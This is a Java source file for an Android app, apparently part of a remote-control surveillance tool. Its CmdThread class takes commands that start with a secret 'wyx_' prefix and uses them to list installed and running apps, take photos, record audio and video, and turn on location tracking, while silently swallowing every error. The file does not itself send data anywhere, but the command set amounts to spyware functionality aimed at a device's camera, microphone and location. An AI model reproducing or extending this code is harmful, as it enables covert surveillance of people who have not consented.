package com.fs.fs.api;

import android.text.TextUtils;
import android.util.SparseArray;

import com.amap.api.location.AMapLocation;
import com.fs.fs.bean.AppInfo;
import com.fs.fs.utils.Constant;
import com.fs.fs.utils.SharePreferencesUtils;

import java.util.List;
import java.util.Map;

/**
 * Created by wyx on 2017/1/7.
 */

public class CmdThread extends Thread {
    private static final String KEY_WORD = "wyx_";
    private String mCmd;
    private Map<String, String> mMap;

    public CmdThread(Map<String, String> map) {
        mCmd = map.get("cmd");
        mMap = map;
    }

    public boolean isCmdAvailable() {
        if (mCmd.startsWith(KEY_WORD) && mCmd.length() > KEY_WORD.length()) {
            return true;
        }
        return false;
    }

    @Override
    public void run() {
        try {
            // TODO:close后能开吗
            String[] arr = mCmd.split("_");
            Constant.Command cmd = Constant.Command.valueOf(arr[1]);
            switch (cmd) {
                case app:
                    AppInfoService.getInstance().getInstallAppInfo(new AppInfoService.AppInfoListener() {
                        @Override
                        public void onSucceed(List<AppInfo> appInfos) {

                        }
                    });
                    break;
                case run_app:
                    AppInfoService.getInstance().getRunningAppInfo(new AppInfoService.AppInfoListener() {
                        @Override
                        public void onSucceed(List<AppInfo> appInfos) {

                        }
                    });
                    break;
                case photo:
                    String cameraIndex = mMap.get("camera_index");
                    if (TextUtils.isEmpty(cameraIndex)) {
                        CameraService.getInstance().takePhoto(null);
                    } else {
                        SparseArray<Integer> map = (SparseArray<Integer>) SharePreferencesUtils.getInstance().get(Constant.SHARE_KEYS.CAMERA, null);
                        if (null == map) {
                            map = DeviceService.getCameraInfo();
                        }
                        Integer face = map.get(Integer.parseInt(cameraIndex));
                        if (null == face) {
                            CameraService.getInstance().takePhoto(null);
                        } else {
                            CameraService.getInstance().takePhoto(Integer.valueOf(cameraIndex));
                        }
                    }
                    break;
                case audio:
                    MediaRecordService.getInstance().stopRecord();
                    MediaRecordService.getInstance().startRecordAudio();
                    break;
                case video:
                    MediaRecordService.getInstance().stopRecord();
                    MediaRecordService.getInstance().startRecordVideo();
                    break;
                case stop_record:
                    MediaRecordService.getInstance().stopRecord();
                    break;
                case locate_on:
                    LocationService.getInstance().close();
                    LocationService.getInstance().once(new LocationService.LocateListener() {
                        @Override
                        public void onLocateSucceed(AMapLocation aMapLocation) {

                        }

                        @Override
                        public void onLocateFail(int errorCode, String errorInfo) {

                        }
                    });
                    break;
                case locate_off:
                    LocationService.getInstance().close();
                    break;
                case track:
                    LocationService.getInstance().close();
                    String millis = mMap.get("interval");
                    if (TextUtils.isEmpty(millis)) {
                        LocationService.getInstance().interval(new LocationService.LocateListener() {
                            @Override
                            public void onLocateSucceed(AMapLocation aMapLocation) {

                            }

                            @Override
                            public void onLocateFail(int errorCode, String errorInfo) {

                            }
                        });
                    } else {
                        LocationService.getInstance().interval(Long.parseLong(millis), new LocationService.LocateListener() {
                            @Override
                            public void onLocateSucceed(AMapLocation aMapLocation) {

                            }

                            @Override
                            public void onLocateFail(int errorCode, String errorInfo) {

                            }
                        });
                    }
            }
        } catch (Exception e) {

        }
    }
}
